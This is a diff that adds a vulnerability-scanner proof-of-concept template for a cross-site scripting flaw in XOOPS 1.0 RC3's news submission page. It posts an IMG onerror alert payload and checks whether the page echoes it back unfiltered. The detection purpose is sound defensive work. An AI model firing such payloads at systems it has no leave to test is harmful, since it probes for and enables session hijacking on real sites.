@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "Xoops 1.0 RC3 新闻提交功能存在跨站脚本漏洞，攻击者可在 IMG 标签中嵌入 JavaScript 代码。当管理员或用户查看提交的新闻内容时，浏览器会执行嵌入的脚本，导致会话劫持、页面篡改或敏感信息泄露。本检测通过向新闻提交接口发送包含恶意 IMG 标签的载荷，验证服务端是否回显未过滤的 HTML 内容。"
+id = "POC-AVE-2002-0680"
+name = "XOOPS 1.0 RC3 跨站脚本漏洞检测"
+severity = "medium"
+tags = ["ave-2002-0680"]
+vuln_id = [
+    "CVE-2002-1802",
+    "AVE-2002-0680",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/modules/news/submit.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "title=XSS+Test&story=<img+src=x+onerror=alert(1)>&op=Preview"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert(1)>"]
